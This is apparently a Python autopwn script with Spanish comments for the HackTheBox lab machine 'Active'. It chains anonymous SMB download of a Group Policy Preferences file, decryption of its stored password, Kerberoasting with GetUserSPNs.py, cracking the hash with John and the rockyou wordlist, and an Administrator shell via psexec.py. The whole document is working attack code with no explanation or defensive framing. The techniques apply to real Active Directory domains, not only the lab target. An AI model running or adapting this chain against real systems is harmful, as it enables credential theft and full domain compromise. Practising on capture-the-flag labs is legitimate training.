from pwn import *
import sys, signal, time, subprocess, glob, shutil, socket

def def_handler(sig, frame):
    print("[!] Saliendo...")
    sys.exit(1)
    
signal.signal(signal.SIGINT, def_handler)

# Configuracion
target = "10.10.10.100"
domain = "active.htb"
wordlist = "/usr/share/wordlists/rockyou.txt"

# Checkeamos conectividad con el puerto SMB
def checkSMB():
    print()
    log.info("Comprobando conexion con el puerto SMB")
    time.sleep(1)
    
    try:
        with socket.create_connection((target, 445), timeout=2):
            log.success("Conexion exitosa")
    except Exception as e:
        log.error(f"Conexion fallida: {e}")
        
# Descargamos mediante SMB el archivo con las credenciales.
def downloadGPP():
    time.sleep(1)
    print()
    log.info("Descargando credenciales gpp.xml")
    
    try:
        # Descargamos credenciales gpp.xml
        subprocess.run(rf"smbmap -H {target} -u '' -p '' --download Replication/active.htb/Policies/{{31B2F340-016D-11D2-945F-00C04FB984F9}}/MACHINE/Preferences/Groups/Groups.xml", shell=True, text=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        
        # Renombramos el archivo .xml
        xml_file = glob.glob("*.xml")
        if xml_file:
            shutil.move(xml_file[0], "gpp.xml")
            log.success("Archivo descargado correctamente")
        else: log.error(f"No se encontro el archivo .xml")
            
    except Exception as e:
        log.error(f"Error inesperado {e}")


# Extraemos credenciales y crackeamos la password cifrada.
def extractCredentials():
    time.sleep(1)
    print()
    log.info("Extrayendo y crackeando credenciales del gpp.xml")
    
    try:
        u = subprocess.run("cat gpp.xml | grep -oP 'userName=\"active.htb\\\\\\K[^\"]+'", shell=True, text=True, check=True, capture_output=True)
        user = u.stdout.strip()
        
        password_cifrada = subprocess.run("cat gpp.xml | grep -oP 'cpassword=\"\\K[^\"]+'", shell=True, text=True, check=True, capture_output=True)
        time.sleep(1)
        p = subprocess.run(f"gpp-decrypt {password_cifrada.stdout.strip()}", shell=True, text=True, capture_output=True)
        password = p.stdout.strip()
        
        log.success(f"Usuario: {user}")
        log.success(f"Password: {password}")
        
        return user, password
    
    except Exception as e:
        log.error(f"No se pudo extraer las credenciales {e}")


# Checkeamos conectividad con el puerto Kerberos.
def checkKerberos():
    print()
    time.sleep(1)
    
    log.info("Comprobando conexion con el puerto Kerberos")
    
    try:
        with socket.create_connection((target, 88), timeout=2):
            time.sleep(1)
            log.success("Conexion exitosa")
        
    except Exception as e:
        log.error(f"Conexion fallida: {e}")


# Obtenemos el TGS cifrado y lo crackeamos con John.
def attackKerberos(user, password):
    time.sleep(1)
    
    k = None
    
    try:
        log.info("Realizando Kerberoasting Attack")
        k = subprocess.run(f"GetUserSPNs.py {domain}/{user}:{password} -dc-ip {target} -request | grep '^\\$krb5tgs'", shell=True, text=True, check=True, capture_output=True)

        if not k or not k.stdout.strip():
            log.error(f"No se pudo obtener el hash")
                
        #Creamos el archivo hash.txt y metemos el hash de kerberos.
        with open("hash.txt", "w") as f:
            f.write(k.stdout.strip())
        
    except Exception as e:
        log.error(f"Error inesperado: {e}")
    
    try:
        time.sleep(1)
        log.info("Crackeando hash con John")
        subprocess.run(f"john -w={wordlist} hash.txt", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        pass_admin = subprocess.run(f"john --show hash.txt | awk -F: '{{print $2}}'", shell=True, text=True, capture_output=True)
        
        if pass_admin:
            log.success(f"La contraseña de Administrator es: {pass_admin.stdout.strip()}")
            return pass_admin.stdout.strip()
        else:
            log.error("John no pudo crackear la contraseña, proba con rockyou.txt")
            
    except Exception as e:
        log.error(f"Error inesperado: {e}")


# Nos logeamos como Admin por SMB con psexec.py.
def connectSMB(pass_admin):
    print()
    time.sleep(1)
    
    try:
        log.info("Logeandonos como Administrator por SMB")
        subprocess.run(f"psexec.py {domain}/Administrator:{pass_admin}@{target}", shell=True, text=True, check=True, stderr=subprocess.DEVNULL)
        
    except Exception as e:
        log.error(f"Error al logearse: {e}")

# Flujo del script.
if __name__ == '__main__':
    
    checkSMB()
    downloadGPP()

    user, password = extractCredentials()
    
    checkKerberos()
    pass_admin = attackKerberos(user, password)
    
    connectSMB(pass_admin)